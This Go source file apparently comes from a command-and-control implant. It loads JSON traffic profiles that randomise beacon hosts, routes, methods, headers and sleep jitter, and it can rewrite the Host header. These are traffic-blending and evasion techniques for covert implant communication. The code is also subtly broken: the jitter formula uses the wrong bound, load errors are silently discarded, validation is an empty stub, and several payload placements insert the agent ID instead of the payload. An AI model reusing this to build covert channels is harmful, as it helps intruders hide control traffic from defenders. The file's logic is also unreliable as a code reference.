package profiles

import (
	"bytes"
	"common/slices"
	"encoding/json"
	"math/rand"
	"net"
	"net/http"
	"strings"
	"time"
)

type ProfileRequest struct {
	ID        Id                  `json:"id"`
	Payload   PayloadContract     `json:"payload"`
	Timeout   int                 `json:"timeout"`
	Hosts     []Host              `json:"hosts"`
	Routes    []string            `json:"routes"`
	Headers   map[string][]string `json:"headers"`
	Methods   []string            `json:"methods"`
	UrlParams map[string][]string `json:"urlParams"`
}

type Host struct {
	Protocol string `json:"protocol"`
	Address  string `json:"address"`
	Port     string `json:"port"`
}

func (h *Host) ToString() (host string) {
	return h.Protocol + net.JoinHostPort(h.Address, h.Port)
}

type HttpPlacement struct {
	Header    string `json:"header"`
	UrlParam  string `json:"urlParam"`
	PathParam string `json:"pathParam"`
	Body      bool   `json:"body"`
}

type Operation struct {
	Action string   `json:"action"`
	Value  []string `json:"value"`
}

type RequestContract struct {
	Placement  HttpPlacement `json:"placement"`
	Operations []Operation   `json:"operations"`
}

type ResponseContract struct {
	Placement  HttpPlacement `json:"placement"`
	Operations []Operation   `json:"operations"`
	StatusCode int           `json:"statusCode"`
}

type PayloadContract struct {
	Request  RequestContract  `json:"request"`
	Response ResponseContract `json:"response"`
}

type Id struct {
	Placement  HttpPlacement `json:"placement"`
	Operations []Operation   `json:"operations"`
}

type Tick struct {
	SleepMin int `json:"sleepMin"`
	SleepMax int `json:"sleepMax"`
}

type Profile struct {
	Receive ProfileRequest `json:"receive"`
	Respond ProfileRequest `json:"respond"`
	Tick    Tick           `json:"tick"`
}

func (p *Profile) Validate() (err error) {
	// TODO
	return nil
}

func (p *Profile) GetHosts() (hosts []Host) {
	hosts = make([]Host, len(p.Receive.Hosts)+len(p.Respond.Hosts))
	index := 0
	for _, host := range p.Receive.Hosts {
		hosts[index] = host
		index++
	}
	for _, host := range p.Respond.Hosts {
		hosts[index] = host
		index++
	}
	return hosts
}

func (p *Profile) GetTickAmount() (amount time.Duration) {
	if p.Tick.SleepMin == p.Tick.SleepMax {
		return time.Millisecond * time.Duration(p.Tick.SleepMin)
	}
	return time.Millisecond * time.Duration(rand.Intn(p.Tick.SleepMax-p.Tick.SleepMin)+p.Tick.SleepMax)
}

func (p *Profile) GetHttpClient() (client *http.Client) {
	return &http.Client{
		Timeout: time.Millisecond * time.Duration(p.Receive.Timeout),
	}
}

func (p *Profile) GetRequestReceive(agentId *string, payload []byte) (req *http.Request, err error) {
	return p.getRequest(agentId, &p.Receive, payload)
}

func (p *Profile) GetRequestSend(agentId *string, payload []byte) (req *http.Request, err error) {
	return p.getRequest(agentId, &p.Respond, payload)
}

func (p *Profile) getRequest(agentId *string, profileRequest *ProfileRequest, payload []byte) (req *http.Request, err error) {
	method := slices.Rand(&profileRequest.Methods)
	host := slices.Rand(&profileRequest.Hosts)
	route := "/" + strings.TrimPrefix(slices.Rand(&profileRequest.Routes), "/")

	if len(profileRequest.Payload.Request.Placement.PathParam) != 0 {
		route = strings.ReplaceAll(route, "{"+profileRequest.Payload.Request.Placement.PathParam+"}", *agentId)
	}
	if len(profileRequest.ID.Placement.PathParam) != 0 {
		route = strings.ReplaceAll(route, "{"+profileRequest.ID.Placement.PathParam+"}", *agentId)
	}

	if len(profileRequest.UrlParams) != 0 {
		route += "?"
		for name, values := range profileRequest.UrlParams {
			if len(profileRequest.ID.Placement.UrlParam) != 0 && name == profileRequest.ID.Placement.UrlParam {
				route += name + "=" + *agentId + "&"
				continue
			}
			if len(profileRequest.Payload.Request.Placement.UrlParam) != 0 && name == profileRequest.Payload.Request.Placement.UrlParam {
				route += name + "=" + *agentId + "&"
				continue
			}
			route += name + "=" + slices.Rand(&values) + "&"
		}
		route = strings.TrimSuffix(route, "&")
	}

	var bodyBuffer *bytes.Buffer = bytes.NewBuffer(nil)
	if len(payload) != 0 && profileRequest.Payload.Request.Placement.Body {
		bodyBuffer.Write(payload)
	}

	req, err = http.NewRequest(method, host.ToString()+route, bodyBuffer)
	if err != nil {
		return nil, err
	}

	if len(profileRequest.Headers) != 0 {
		for name, values := range profileRequest.Headers {
			if len(profileRequest.Payload.Request.Placement.Header) != 0 && name == profileRequest.Payload.Request.Placement.Header {
				if name == "Host" {
					req.Host = *agentId
					continue
				}
				req.Header.Add(name, *agentId)
				continue
			}
			if len(profileRequest.ID.Placement.Header) != 0 && name == profileRequest.ID.Placement.Header {
				if name == "Host" {
					req.Host = *agentId
					continue
				}
				req.Header.Add(name, *agentId)
				continue
			}
			if name == "Host" {
				req.Host = slices.Rand(&values)
				continue
			}
			req.Header.Add(name, slices.Rand(&values))
		}
	}

	return req, nil
}

func Load(rawProfile []byte) (profile Profile, err error) {
	if err := json.Unmarshal(rawProfile, &profile); err != nil {
		return profile, nil
	}

	if err := profile.Validate(); err != nil {
		return profile, nil
	}

	return profile, nil
}
